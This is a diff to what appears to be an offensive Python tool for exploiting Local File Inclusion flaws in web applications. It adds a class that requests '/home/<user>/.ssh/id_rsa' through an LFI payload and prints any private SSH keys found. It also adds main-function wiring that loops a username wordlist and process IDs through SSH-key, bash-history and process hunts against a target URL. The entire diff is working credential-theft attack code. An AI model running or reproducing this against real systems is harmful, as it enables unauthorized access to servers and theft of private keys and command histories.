@@ -45,6 +45,21 @@ class LFIHuntBase:
     def hunt(self, payload_suffix):
         raise NotImplementedError("Subclasses should implement this!")
 
+class SSHKeysLFIHunt(LFIHuntBase):
+    def hunt(self, username):
+        ssh_payload = self.url + self.lfi_payload + f"/home/{username}/.ssh/id_rsa"
+        req = HTTPClient().get(ssh_payload)
+        if len(req.text) > self.check_size:
+            lines = [
+                f"Found: \x1b[6;30;42mSSH Keys for {username.strip()}\x1b[0m",
+                f"\n{req.text}\n",
+                "\033[31m" + "*" * 100 + "\x1b[0m"
+            ]
+            self.output_handler.write_output(lines)
+        else:
+            print(f"No SSH keys found for user(s) {username.strip()}")
+            print("\033[31m" + "*" * 100 + "\x1b[0m")
+
 class HistoryLFIHunt(LFIHuntBase):
     def hunt(self, username):
         history_payload = self.url + self.lfi_payload + f"/home/{username}/.bash_history"
@@ -110,6 +125,27 @@ def main():
     parser.add_argument('-a', metavar='<User-Agent>', help="Example: -a Linux", required=False)
     parser.add_argument('-p', metavar='<Proxies>', help="Example: -p 127.0.0.1:8080", required=False)
     args = parser.parse_args()
+
+    headers = {"User-Agent": args.a, "Cookie": args.c, "Header": args.H} if args.a or args.c or args.H else None
+    proxies = {"http": f"http://{args.p}"} if args.p else None
+
+    client = HTTPClient(headers=headers, proxies=proxies)
+    req = client.get(args.u + args.l + "/9fX1SxbT61qUDQKjpDWo8ApV3YTVLpz5ThM3wJ6XOqlaz")
+    check_size = len(req.text)
+
+    output_handler = FileOutputHandler(args.o) if args.o else ConsoleOutputHandler()
+
+    engine = LFIEngine(args.u, args.l, check_size, output_handler, args.t)
+
+    with open(args.w, 'r') as wordlist_file:
+        wordlist = [line.rstrip() for line in wordlist_file]
+        engine.run_hunt(LFIHuntBase, wordlist)
+
+    pids = range(1, int(args.pid) + 1)
+    engine.run_hunt(ProcessLFIHunt, pids)
+
+    engine.run_hunt(SSHKeysLFIHunt, wordlist)
+    engine.run_hunt(HistoryLFIHunt, wordlist)
 
 if __name__ == "__main__":
     main()
